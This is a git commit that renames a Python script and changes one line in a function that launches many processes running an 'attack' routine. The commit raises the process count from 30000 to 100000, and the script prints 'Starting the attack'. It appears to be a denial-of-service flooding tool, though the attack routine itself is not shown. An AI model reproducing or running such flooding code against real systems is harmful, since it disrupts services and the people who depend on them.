b2bf68d110144d9c68b069fd60f2e8ee122eea7d
Bechebeche999 <92576929+Bechebeche999@users.noreply.github.com>
2021-11-09 06:50:04 -0900

    Update and rename uferbogf.py to ufebogf.py

--- ufebogf.py
+++ ufebogf.py
@@ -50,7 +50,7 @@ print("[>>>] Starting the attack [<<<]")
 sleep(1)
 
 def send2attack():
-  for i in range(30000): #Magic Power
+  for i in range(100000): #Magic Power
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
